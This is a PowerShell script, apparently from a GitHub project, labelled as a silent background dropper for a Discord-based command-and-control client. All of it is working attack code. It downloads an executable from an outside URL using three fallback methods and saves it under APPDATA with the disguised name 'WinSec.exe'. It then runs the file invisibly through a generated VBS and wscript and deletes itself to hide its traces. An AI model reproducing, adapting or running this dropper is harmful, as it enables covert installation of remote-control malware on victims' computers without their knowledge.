# DiscordC2 — Silent Background Dropper
# Author: IMApurbo
# https://github.com/IMApurbo/discordC2

$ErrorActionPreference = 'SilentlyContinue'

$url  = "https://github.com/IMApurbo/discordC2/releases/download/C2/c2_client.exe"
$dest = "$env:APPDATA\Microsoft\Windows\WinSec.exe"

# ── folder ────────────────────────────────────────────────────
$folder = Split-Path $dest
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}

# ── download ──────────────────────────────────────────────────
$downloaded = $false

# method 1 — WebClient
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($url, $dest)
    $downloaded = $true
} catch {}

# method 2 — Invoke-WebRequest
if (!$downloaded) {
    try {
        Invoke-WebRequest -Uri $url `
                          -OutFile $dest `
                          -UseBasicParsing `
                          -UserAgent "Mozilla/5.0"
        $downloaded = $true
    } catch {}
}

# method 3 — BITS
if (!$downloaded) {
    try {
        Import-Module BitsTransfer
        Start-BitsTransfer -Source $url -Destination $dest
        $downloaded = $true
    } catch {}
}

# ── verify ────────────────────────────────────────────────────
if (!(Test-Path $dest)) { exit 1 }
$size = (Get-Item $dest).Length
if ($size -lt 100000) {
    Remove-Item $dest -Force
    exit 1
}

# ── launch via vbs so zero window appears ─────────────────────
$vbs = "$env:APPDATA\Microsoft\Windows\wrun.vbs"

Set-Content -Path $vbs -Value @"
Set o = CreateObject("WScript.Shell")
o.Run Chr(34) & "$dest" & Chr(34), 0, False
"@

Start-Process "wscript.exe" `
    -ArgumentList "//B //Nologo `"$vbs`"" `
    -WindowStyle Hidden

# ── self delete ───────────────────────────────────────────────
$self = $MyInvocation.MyCommand.Path
if ($self -and (Test-Path $self)) {
    Start-Sleep -Seconds 2
    Remove-Item $self -Force
}
